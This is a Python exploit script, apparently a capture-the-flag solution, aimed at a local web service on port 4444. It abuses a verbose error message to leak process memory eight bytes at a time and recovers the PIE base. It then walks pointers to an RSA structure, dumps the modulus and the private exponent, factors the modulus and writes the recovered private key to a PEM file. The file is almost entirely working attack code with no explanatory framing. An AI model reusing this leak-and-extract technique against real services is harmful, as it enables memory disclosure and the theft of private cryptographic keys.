from gen_backdoor_pub import *
import requests
from pwn import *

VIEW_URL = "http://127.0.0.1:4444/view"

# Leak 8 bytes from the offset.
def leak(offset: int) -> int:
    yorixpub = gen_backdoor_pub(offset)
    response = requests.post(VIEW_URL, json={"yorixpub": yorixpub, "password": "yorix"})
    return int(response.json()["error"].split("too large length: ")[1].split(") - aborting")[0])

pie_base_0 = -0xa8e23
rsa_priv_wrapper_0 = 0xf6ca0

assert(p64(leak(pie_base_0))[:4] == b"\x7FELF")

init_array_offset_0 = 0xf2f68
pie_base_1 = leak(init_array_offset_0 + pie_base_0) - 0x11ec0

print("PIE Base: ", hex(pie_base_1))

rsa_priv_wrapper_1 = leak(pie_base_0 + rsa_priv_wrapper_0 + 16)

print("RSA Priv Wrapper (RSA Struct Address): ", hex(rsa_priv_wrapper_1))

BITS = 0x100
def get_bignum(offset: int, bits_: int = BITS) -> int:
    res = 0
    for i in range(0, bits_, 8):
        res |= leak(offset + i) << (i * 8)
    return res

n_address_0 = leak(pie_base_0 - pie_base_1 + rsa_priv_wrapper_1 + 40)
n_address_1 = leak(pie_base_0 - pie_base_1 + n_address_0)

print("RSA Modulus (Address): ", hex(n_address_1))

n_0 = get_bignum(pie_base_0 - pie_base_1 + n_address_1)
print("RSA Modulus (Value): ", hex(n_0))

e_address_0 = leak(pie_base_0 - pie_base_1 + rsa_priv_wrapper_1 + 48)
e_address_1 = leak(pie_base_0 - pie_base_1 + e_address_0)

print("RSA Exponent (Address): ", hex(e_address_1))

e_0 = get_bignum(pie_base_0 - pie_base_1 + e_address_1, 3)
print("RSA Exponent (Value): ", hex(e_0))

d_address_0 = leak(pie_base_0 - pie_base_1 + rsa_priv_wrapper_1 + 56)
d_address_1 = leak(pie_base_0 - pie_base_1 + d_address_0)

print("RSA Private Exponent (Address): ", hex(d_address_1))

d_0 = get_bignum(pie_base_0 - pie_base_1 + d_address_1)
print("RSA Private Exponent (Value): ", hex(d_0))


import random
import math
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def compute_p_q(n, e, d):
    k = e * d - 1
    if k % 2 == 1:
        raise ValueError("Cannot factor n with given e and d.")

    # Factor out powers of 2 from k to get t
    s = 0
    t = k
    while t % 2 == 0:
        t //= 2
        s += 1

    for _ in range(100):
        g = random.randrange(2, n - 1)
        y = pow(g, t, n)
        if y == 1 or y == n - 1:
            continue
        for r in range(s):
            x = pow(y, 2, n)
            if x == 1:
                p = math.gcd(y - 1, n)
                q = n // p
                if p * q == n:
                    return (p, q)
            if x == n - 1:
                break
            y = x
    raise ValueError("Failed to compute p and q.")

def generate_private_key_pem(n, e, d):
    # Compute p and q
    p, q = compute_p_q(n, e, d)
    # Ensure p < q
    if p > q:
        p, q = q, p
    dmp1 = d % (p - 1)
    dmq1 = d % (q - 1)
    iqmp = pow(q, -1, p)  # Inverse of q mod p

    public_numbers = rsa.RSAPublicNumbers(e, n)
    private_numbers = rsa.RSAPrivateNumbers(
        p=p,
        q=q,
        d=d,
        dmp1=dmp1,
        dmq1=dmq1,
        iqmp=iqmp,
        public_numbers=public_numbers
    )
    private_key = private_numbers.private_key()

    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    return pem.decode('utf-8')

with open('leaked_private.pem', 'w') as f:
    f.write(generate_private_key_pem(n_0, e_0, d_0))